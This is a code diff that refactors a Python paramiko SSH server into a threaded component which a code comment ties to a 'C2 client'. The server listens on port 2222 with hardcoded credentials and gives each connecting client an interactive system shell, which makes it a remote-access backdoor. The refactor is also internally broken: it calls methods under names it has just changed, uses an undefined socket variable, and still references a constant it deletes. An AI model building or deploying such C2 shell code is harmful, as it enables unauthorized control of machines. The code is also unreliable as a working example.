@@ -8,12 +8,12 @@ import pty
 import os
 import select
 
-QUIT_CMD = "quit"
-
 class Server(paramiko.ServerInterface):
     def __init__(self):
         self.event = threading.Event()
         self.input = ""
+        self.username = "user"
+        self.password = "foo"
 
     def check_channel_request(self, kind, chanid): 
         if kind == "session":
@@ -54,7 +54,93 @@ class Server(paramiko.ServerInterface):
     def check_channel_pty_request(self, channel, term, width, height, pixelwidth, pixelheight, modes):
         return True
 
-    def setup_pty(self):
+
+class ServerThread(threading.Thread):
+    def __init__(self, commands):
+        # `commands` is a Queue of commands from the main C2 client class
+        super(ServerThread, self).__init__()
+        self.server = Server()
+        self.commands = commands
+        self.stop_request = threading.Event()
+        self.QUIT_CMD = "quit"
+        self.PORT = 2222
+
+    def run(self):
+        sock = self._setup_sock()
+
+        while not self.stop_request.is_set():
+            try:
+                sock.listen(100)
+                print("Listening...")
+                client, addr = sock.accept()
+                print("Connected!")
+
+            except Exception as e:
+                print("*** Failed to connect ***")
+            
+            try:
+                chan, trans = self._establish_channel()
+
+                if chan is None:
+                    print("*** No Channel ***")
+
+                else:
+                    print("Authenticated!")
+
+                    self.server.event.wait(10)
+
+                    if not self.server.event.is_set():
+                        print("*** Client did not ask for a shell! ***")
+                    
+                    command = ""
+                    self.setup_pty()
+
+                    while command != QUIT_CMD:
+                        command = self.run_pty(chan)
+
+                    chan.close()
+            
+                trans.close()
+
+            except paramiko.SSHException as e:
+                print("*** SSH negotiation failure ***")
+
+                if chan:
+                    chan.close()
+                if trans:
+                    trans.close()
+    
+                traceback.print_exc()
+
+    def join(self, timeout=None):
+        self.stop_request.set()
+        super(ServerThread, self).join(timeout)
+
+    def _setup_sock(self):
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+            sock.bind(("", self.PORT))
+
+            return sock
+
+        except Exception as e:
+            print("*** Failed to open socket ***")
+            self.stop_request.set()
+
+    def _establish_channel(self):
+        trans = paramiko.Transport(client)
+        
+        host_key = paramiko.RSAKey(filename="host_key")
+        trans.add_server_key(host_key)
+        trans.start_server(server=self.server)
+        print("Server started!")
+
+        chan = trans.accept(60)
+
+        return chan, trans
+
+    def _setup_pty(self):
         child_args = [os.environ["SHELL"]]
         (self.pty_pid, self.pty_fd) = pty.fork()
 
@@ -62,7 +148,7 @@ class Server(paramiko.ServerInterface):
             os.execlp(child_args[0], *child_args)
             os._exit(-1)
 
-    def run_pty(self, channel):
+    def _run_pty(self, channel):
         rds, wrs, ers = select.select([self.pty_fd, channel.fileno()], [], [])
         data = ""
 
@@ -83,73 +169,4 @@ class Server(paramiko.ServerInterface):
             data = QUIT_CMD
 
         return data
-
-def setup_sock():
-    try:
-        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-        sock.bind(("", 2222))
-
-        return sock
-
-    except Exception as e:
-        print("*** Failed to open socket ***")
-        sys.exit(1)
-
-def establish_channel():
-    trans = paramiko.Transport(client)
     
-    host_key = paramiko.RSAKey(filename="host_key")
-    trans.add_server_key(host_key)
-    server = Server()
-    trans.start_server(server=server)
-    print("Server started!")
-
-    chan = trans.accept(60)
-
-    return chan, trans, server
-
-sock = setup_sock()
-
-run = True
-
-while run:
-    try:
-        sock.listen(100)
-        print("Listening...")
-        client, addr = sock.accept()
-        print("Connected!")
-
-    except Exception as e:
-        print("*** Failed to connect ***")
-    
-    try:
-        chan, trans, server = establish_channel()
-
-        if chan is None:
-            print("*** No Channel ***")
-
-        else:
-            print("Authenticated!")
-
-            server.event.wait(10)
-
-            if not server.event.is_set():
-                print("*** Client did not ask for a shell! ***")
-            
-            command = ""
-            server.setup_pty()
-
-            while command != QUIT_CMD:
-                command = server.run_pty(chan)
-
-            chan.close()
-    
-        trans.close()
-        
-    except KeyboardInterrupt as inter:
-        print("Closing...")
-
-    except paramiko.SSHException as e:
-        print("*** SSH negotiation failure ***")
-        traceback.print_exc()
